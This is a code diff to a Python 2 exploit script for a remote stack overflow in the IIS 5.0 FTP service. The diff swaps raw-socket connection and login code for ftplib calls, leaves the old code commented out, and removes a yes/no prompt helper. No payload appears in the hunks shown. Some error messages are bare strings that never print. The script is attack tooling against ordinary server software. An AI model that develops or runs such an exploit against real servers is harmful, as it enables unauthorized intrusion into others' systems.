@@ -98,15 +98,7 @@ def parse_args():
         ftp_user = "anonymous"
         ftp_pass = "anonymous"
 
-#ask user yes or no and return 1 for yes and 0 for no
-def yes_or_no(message):
-    input = raw_input(message+" [y/N]")
-    if (str(input).lower() == "y") or (str(input).lower() == "yes"):
-        return 1
-    elif (str(input).lower() == "n") or (str(input).lower() == "no"):
-        return 0
-    else:
-        return 0    
+
 #code stolen from Alexander Korznikov.
 #Source http://www.korznikov.com/2015/04/convert-any-string-into-hex-x41x41.html
 def string2hex(string):
@@ -158,39 +150,47 @@ def create_tcp_server():
 def main():
     print "IIS 5.0 FTP Remote Stack Overflow Exploit by Disc0rdantMel0dy"
     parse_args()
-
+    
     #create socket
     try:
+        ftp = FTP()
         print "[+] Connecting to FTP Server: %s on port %d" % (ip, port)
-        sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-        sock.settimeout(30)
-        sock.connect((ip,port))
+        ftp.connect(ip,port,timeout=30)        
+        #sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        #sock.settimeout(30)
+        #sock.connect((ip,port))
         print "[+] Connected! Waiting for welcome banner..."
-        
-        data = sock.recv(1024)
-        if data:
-            print data
-        else:
-            "[!] Socket timed out while waiting for welcome banner. Exiting..."
-            sys.exit(-1)                
+        print ftp.getwelcome()
+        #data = sock.recv(1024)
+        #if data:
+        #    print data
+        #else:
+        #    "[!] Socket timed out while waiting for welcome banner. Exiting..."
+        #    sys.exit(-1)                
     except:
         print "[!] Could not connect to FTP Server: %s on port %d" % (ip, port)
         sys.exit(-1)
     
     #Attempt logon to FTP server
     print "[+] Attemping FTP Logon with creds: %s / %s" %(ftp_user, ftp_pass)
-    data = sock.send("USER %s" % ftp_user)
-    print "[+] Sent: USER %s" % ftp_user
+    try:
+        ftp.login(user=ftp_user, passwd=ftp_pass)
+        print "[+] Successfully logged in with creds: %s / %s" %(ftp_user,ftp_pass)
+    except:
+        "[!] Invalid FTP Credentials. If using default credentials please try again specifying valid credentials.  Exiting..."
+        sys.exit(-1)
+    #data = sock.send("USER %s" % ftp_user)
+    #print "[+] Sent: USER %s" % ftp_user
     #data = sock.recv(1024)
-    print data
+    #print data
     
     #if not str(data).startswith("331"):
         #print "[!] Unexpected response from FTP Server.  Exiting..."
         #sys.exit(-1)
-    data = sock.send("PASS %s" % ftp_pass)
-    print "[+] Sent: PASS %s" % ftp_pass
+    #data = sock.send("PASS %s" % ftp_pass)
+    #print "[+] Sent: PASS %s" % ftp_pass
     #data = sock.recv(1024)
-    print data
+    #print data
     #if str(data).startswith("230"):
         #print "[+] Successfully logged in with creds: %s / %s" %(ftp_user,ftp_pass)
     #elif str(data).startswith("530"):
